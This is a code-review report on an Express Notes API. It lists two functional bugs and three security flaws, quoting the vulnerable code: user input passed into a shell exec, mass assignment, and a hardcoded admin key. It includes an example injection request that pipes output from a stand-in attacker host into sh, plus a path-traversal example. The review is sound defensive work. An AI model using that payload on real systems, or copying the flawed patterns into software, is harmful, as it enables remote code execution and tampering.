# Codebase Research — Bug 001 (Notes API)

Scope: `src/` (Express Notes API). Cross-referenced against
`context/bugs/001/bug-context.md`.

---

### Finding 1

**File:** src/routes/notes.js
**Line:** 29

**Snippet:**
```js
  const start = page * limit;
```

**Root cause:** Pagination is 1-indexed (`page` defaults to `1`), but the
offset is computed as `page * limit` instead of `(page - 1) * limit`. For the
very first page (`page=1`, `limit=10`) this sets `start = 10`, so `notes.slice(start, start + limit)` skips the first `limit` items entirely and returns the
*second* batch instead of the first.

**Impact:** Matches reported issue #1 ("Pagination looks wrong... first batch
of notes was being skipped entirely"). Every page returned is off by one full
page — page 1 shows what should be page 2's data, and the true first page of
notes is never reachable through the API. With `notes.length` = 12 and
`limit=10`, requesting `page=1` returns only the last 2 notes (ids 11–12)
instead of the first 10.

---

### Finding 2

**File:** src/routes/notes.js
**Line:** 37

**Snippet:**
```js
  const results = notes.filter((n) => n.title.includes(q));
```

**Root cause:** `String.prototype.includes` is case-sensitive, and neither
`n.title` nor `q` is normalized before comparison. A lowercase query like
`meeting` will not match a title such as `"Weekly Meeting Notes"` (capital
"M"), even though the substring is clearly present.

**Impact:** Matches reported issue #2 ("Search misses obvious matches...
Casing of the query seems to matter when it shouldn't"). Any case mismatch
between the query and stored titles causes valid matches to be silently
dropped from search results.

---

### Finding 3

**File:** src/routes/notes.js
**Lines:** 41-56

**Snippet:**
```js
router.get('/export', (req, res) => {
  const filename = req.query.filename || 'notes-export.json';

  if (!fs.existsSync(EXPORTS_DIR)) {
    fs.mkdirSync(EXPORTS_DIR, { recursive: true });
  }

  const payload = JSON.stringify(notes).replace(/'/g, "'\\''");
  const cmd = `echo '${payload}' > ${filename}`;

  exec(cmd, { cwd: EXPORTS_DIR }, (err) => {
    if (err) {
      return res.status(500).json({ error: 'export failed', detail: err.message });
    }
    res.json({ exported: filename });
  });
});
```

**Root cause:** The `filename` query parameter is user-controlled and is
interpolated, unescaped and unvalidated, directly into a shell command string
that is then executed via `child_process.exec` (which spawns `/bin/sh -c
<cmd>`). Only the JSON `payload` is shell-escaped (line 48); `filename` gets
no quoting, no character allow-listing, and no path containment check against
`EXPORTS_DIR`.

**Impact:** Classic OS command injection (CWE-78). A request such as
`GET /api/notes/export?filename=x;curl%20attacker.com|sh` (or using backticks
`` ` ``, `$( )`, `&&`, `|`, redirection, etc.) lets an attacker execute
arbitrary shell commands with the privileges of the Node process. Even
without full injection, `filename` also permits path traversal (e.g.
`../../etc/cron.d/evil` or an absolute path) to write the exported JSON
outside `EXPORTS_DIR`, since `exec` runs with `cwd: EXPORTS_DIR` but the
`filename` string is not resolved/validated against that directory.

---

### Finding 4

**File:** src/routes/notes.js
**Lines:** 73-80

**Snippet:**
```js
router.patch('/:id', (req, res) => {
  const note = notes.find((n) => n.id === parseInt(req.params.id, 10));
  if (!note) return res.status(404).json({ error: 'not found' });

  Object.assign(note, req.body);
  note.updatedAt = new Date().toISOString();
  res.json(note);
});
```

**Root cause:** `Object.assign(note, req.body)` blindly merges the entire
client-supplied request body onto the stored note object with no allow-list
or schema validation. Any field name in `req.body` — including `id`,
`ownerId`, and `createdAt` — overwrites the corresponding field on the note.

**Impact:** Mass-assignment vulnerability (CWE-915). A client can `PATCH` a
note it does not own by sending `{"ownerId": "attacker"}` to hijack
ownership, change `id` to collide with/shadow another note (corrupting
`store.notes` lookups by id), or falsify `createdAt`. Combined with no
authentication/authorization checks on this route, this lets any caller
tamper with fields that should be immutable or owner-restricted. This matches
the reviewer's note that "user-supplied input flows into [PATCH /:id] in ways
that weren't fully thought through."

---

### Finding 5

**File:** src/routes/notes.js
**Line:** 10

**Snippet:**
```js
const ADMIN_KEY = 'supersecret-admin-2024';
```

**Root cause:** A hardcoded admin credential is committed directly in source
(used at line 60, `req.headers['x-admin-key'] !== ADMIN_KEY`, to gate the
bulk-delete endpoint `DELETE /api/notes/admin/all`) instead of being read
from an environment variable / secret store.

**Impact:** Matches the reviewer's note about "a hardcoded value in the
routes file that shouldn't be there." Hardcoded secrets (CWE-798) are visible
to anyone with source access (including version control history), cannot be
rotated without a code change/redeploy, and are identical across all
environments (dev/staging/prod), making the admin bulk-delete endpoint
trivially exploitable by anyone who reads the source.

---

## Summary

5 findings total:
- 2 functional bugs (pagination off-by-one-page at notes.js:29; case-sensitive
  search at notes.js:37)
- 3 security issues (command injection / path traversal in the export
  endpoint at notes.js:41-56; mass-assignment in the PATCH endpoint at
  notes.js:73-80; hardcoded admin secret at notes.js:10)
